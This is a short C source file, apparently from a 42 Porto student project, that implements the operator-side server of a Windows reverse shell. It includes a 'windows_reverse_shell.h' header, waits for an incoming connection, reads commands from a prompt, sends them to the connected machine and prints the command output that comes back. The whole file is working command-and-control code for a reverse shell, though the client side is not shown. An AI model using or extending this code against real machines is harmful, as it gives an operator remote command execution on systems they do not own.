/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   winsock_server.c                                   :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: joesanto <joesanto@student.42porto.com>    +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2026/01/11 00:20:47 by joesanto          #+#    #+#             */
/*   Updated: 2026/01/11 19:07:43 by joesanto         ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include <winsock2.h>
#include <ws2tcpip.h>
#include <stdint.h>
#include <stdio.h>
#include "windows_reverse_shell.h"
#include "prompt_command.h"

int	main(void)
{
	SOCKET		server_fd;
	SOCKET		client_fd;
	char		*client_ip;
	char		*command;
	uint64_t	command_len;
	int			bytes_sent;

	printf("Waiting for incoming connections...\n");
	if (winsock_server_connection(&server_fd, &client_fd, &client_ip) != 0)
	{
		fprintf(stderr, "An error occured!\n");
		WSACleanup();
		return (1);
	}
	while (prompt_command(&command, &command_len, client_ip))
	{
		bytes_sent = send(client_fd, command, command_len, 0);
		if (bytes_sent == SOCKET_ERROR) {
			fprintf(stderr, "Send failed: %d\n", WSAGetLastError());
			break;
		}
		winsock_receive_command_output(client_fd);
	}
	closesocket(server_fd);
	closesocket(client_fd);
	WSACleanup();
	return (SUCCESS);
}
